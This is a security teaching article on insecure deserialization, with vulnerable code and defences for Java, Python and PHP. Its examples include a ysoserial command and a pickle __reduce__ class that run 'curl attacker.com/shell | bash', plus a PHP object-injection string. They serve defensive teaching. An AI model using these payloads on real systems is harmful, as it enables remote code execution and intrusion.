# Insecure Deserialization

**Category:** App Security
**Date:** 2026-08-11
**Difficulty:** Advanced

---

## What It Is

Deserialization is the process of converting a stream of bytes (or a string) back into an object in memory. Insecure deserialization occurs when an application deserializes data from an untrusted source without validating its integrity or type safety. An attacker who controls the serialized payload can often manipulate the resulting object graph, triggering unexpected code paths during the reconstruction process itself — before any application logic runs.

## Why It Matters

Insecure deserialization is a perennial OWASP Top 10 entry because it frequently leads to Remote Code Execution (RCE), authentication bypass, or privilege escalation — the worst possible outcomes. The Apache Commons Collections vulnerability (CVE-2015-7501) enabled unauthenticated RCE against WebLogic, JBoss, Jenkins, and dozens of other Java applications; it was trivially exploitable via a single crafted HTTP request and caused widespread compromise years after the patch was published.

## Practical Example

### Java: Gadget Chain RCE

Java's native serialization format (the `ObjectInputStream`) invokes methods on objects as they are reconstructed. Attackers chain together "gadget" classes — legitimate classes already on the classpath — to form an exploit.

**Vulnerable server code:**
```java
// Reads a serialized object straight from user-supplied HTTP body
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // DANGER: executes code during deserialization
```

**Attack payload (conceptual gadget chain using Apache Commons Collections):**
```
# ysoserial generates a serialized payload that executes a command:
java -jar ysoserial.jar CommonsCollections6 'curl attacker.com/shell | bash' > payload.ser
curl -X POST https://target.com/api/import \
     --data-binary @payload.ser \
     -H "Content-Type: application/octet-stream"
```

When the server calls `ois.readObject()`, the gadget chain triggers `Runtime.exec()` — no further conditions required.

### Python: Pickle RCE

Python's `pickle` module is equally dangerous:

```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        # __reduce__ is called during deserialization
        return (os.system, ('curl attacker.com/shell | bash',))

payload = pickle.dumps(Exploit())

# Vulnerable server:
import pickle
def load_user_session(data):
    return pickle.loads(data)  # executes attacker's __reduce__
```

### PHP: Object Injection

PHP's `unserialize()` triggers magic methods (`__wakeup`, `__destruct`) on reconstructed objects:

```php
// Attacker crafts:
// O:4:"User":1:{s:4:"role";s:5:"admin";}
$user = unserialize($_COOKIE['session']);
echo $user->role;  // "admin" — authentication bypassed
```

If a `__destruct` method in any loaded class does something dangerous (like deleting files, executing commands, or making HTTP requests), the attacker can trigger it by serializing an instance of that class.

## How to Defend

- **Never deserialize data from untrusted sources using native formats.** Prefer data-only formats (JSON, Protobuf) that cannot encode executable object graphs. If you must use native serialization, treat the input as hostile.
- **Validate before deserializing.** Use an HMAC or digital signature over the serialized blob. Reject anything whose signature does not verify before calling any deserialization function.
- **Use type-safe deserializers.** In Java, replace `ObjectInputStream` with libraries that enforce an allowlist of permitted classes (e.g., `ValidatingObjectInputStream` from Apache Commons IO, or Jackson with `FAIL_ON_UNKNOWN_PROPERTIES`).
- **Run deserialization in a sandboxed context.** Apply OS-level sandboxing (seccomp, containers with restricted capabilities) so that even if code executes during deserialization, it cannot reach the network or filesystem in a useful way.
- **Keep dependencies patched and monitor for gadget-chain libraries.** Tools like `ysoserial` and `marshalsec` catalogue known gadget classes. Remove unused libraries; update those you keep.

## Today's Challenge

1. Install [ysoserial](https://github.com/frohoff/ysoserial) (or just read its README).
2. Run `java -jar ysoserial.jar` with no arguments to see the list of available gadget chains and the libraries they require.
3. Audit a Java or Python project you have access to: search for `ObjectInputStream`, `pickle.loads`, `unserialize`, or `yaml.load` (without `Loader=yaml.SafeLoader`). For each hit, ask: "Does this data come from outside the trust boundary?"
4. If you find a hit, try replacing it with a safe alternative and document what changed.

## Key Takeaway

Deserialization is code execution — treat any serialized blob from an untrusted source the same way you would treat an untrusted SQL query: never pass it raw to the engine.
